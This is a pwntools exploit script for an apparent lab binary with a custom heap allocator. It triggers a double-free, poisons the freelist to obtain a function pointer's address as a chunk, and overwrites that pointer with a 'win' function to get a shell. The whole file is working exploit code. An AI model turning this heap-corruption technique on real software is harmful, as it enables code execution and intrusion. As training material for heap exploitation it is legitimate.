#!/usr/bin/env python3
"""
Double-Free Exploit Script
Exploits the double-free vulnerability in the custom heap allocator
Compatible with both Linux and macOS
"""

from pwn import *
import re
import platform

def main():
    # Start the vulnerable process
    p = process("../compiled/vulnerable_code")
    
    # Read initial output
    initial_output = p.recvuntil(b"> ").decode()
    print(initial_output)
    
    # Get addresses manually from user
    print("\n" + "="*60)
    print("IMPORTANT: You need to find the target addresses using GDB first!")
    print("Run these commands in GDB to get the addresses:")
    print("  gdb ./vulnerable_code")
    print("  (gdb) break main")
    print("  (gdb) run")
    print("  (gdb) p &gTarget.fn")
    print("  (gdb) p win")
    print("  (gdb) quit")
    print("="*60)
    
    try:
        target_fn_addr = int(input("\nEnter &gTarget.fn address (e.g., 0x404040): "), 16)
        win_addr = int(input("Enter win function address (e.g., 0x4011a0): "), 16)
    except ValueError:
        log.error("Invalid address format! Please use hexadecimal format (e.g., 0x404040)")
        p.close()
        return False
    
    # Detect system architecture for proper packing
    is_64bit = platform.machine().endswith('64') or platform.architecture()[0] == '64bit'
    if is_64bit:
        pack_func = p64
        log.info("Detected 64-bit system, using p64 for packing")
    else:
        pack_func = p32
        log.info("Detected 32-bit system, using p32 for packing")
    
    log.info(f"Target &gTarget.fn address: {hex(target_fn_addr)}")
    log.info(f"Target &win address: {hex(win_addr)}")
    
    def alloc():
        p.sendline(b"alloc")
        response = p.recvuntil(b"> ").decode()
        print(response, end="")
        return response
    
    def free(idx):
        p.sendline(f"free {idx}".encode())
        response = p.recvuntil(b"> ").decode()
        print(response, end="")
        return response
    
    def write(idx, data_hex):
        p.sendline(f"write {idx} {data_hex}".encode())
        response = p.recvuntil(b"> ").decode()
        print(response, end="")
        return response
    
    def call():
        p.sendline(b"call")
        response = p.recvuntil(b"> ", timeout=2).decode()
        print(response, end="")
        return response
    
    try:
        log.info("Step 1: Allocating two chunks (A and B)")
        print(alloc())  # chunk 0 (A)
        print(alloc())  # chunk 1 (B)
        
        log.info("Step 2: Creating dangling pointer by freeing chunk 0 (A)")
        print(free(0))
        
        log.info("Step 3: Triggering double-free by freeing chunk 0 again")
        print(free(0))  # Double free!
        
        log.info(f"Step 4: Poisoning freelist. Writing &gTarget.fn ({hex(target_fn_addr)}) to A's FD")
        poison_payload = pack_func(target_fn_addr).hex()
        print(write(0, poison_payload))
        
        log.info("Step 5: Allocating chunks to get target address as chunk")
        alloc1 = alloc()  # This should return A
        alloc2 = alloc()  # This should return A again due to double-free
        alloc3 = alloc()  # This should return &gTarget.fn
        
        # Check all allocations to find the target address
        target_idx = None
        all_allocations = alloc1 + alloc2 + alloc3
        
        for line in all_allocations.split('\n'):
            if 'alloc idx=' in line and 'ptr=' in line:
                if hex(target_fn_addr) in line:
                    target_idx = int(re.search(r"alloc idx=(\d+)", line).group(1))
                    break
        
        if target_idx is None:
            log.error(f"Failed to get target address! Allocations: {all_allocations}")
            p.close()
            return False
            
        log.success(f"&gTarget.fn address obtained as chunk index {target_idx}!")
        
        log.info(f"Step 6: Taking control! Writing &win ({hex(win_addr)}) to target pointer")
        win_payload = pack_func(win_addr).hex()
        print(write(target_idx, win_payload))
        
        log.info("Final step: Calling the manipulated function pointer!")
        call()
        
        # If we get here, the exploit worked and we should have a shell
        log.success("Exploit completed! You should now have a shell.")
        p.interactive()
        
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        p.close()
        return False
    
    return True

if __name__ == "__main__":
    main()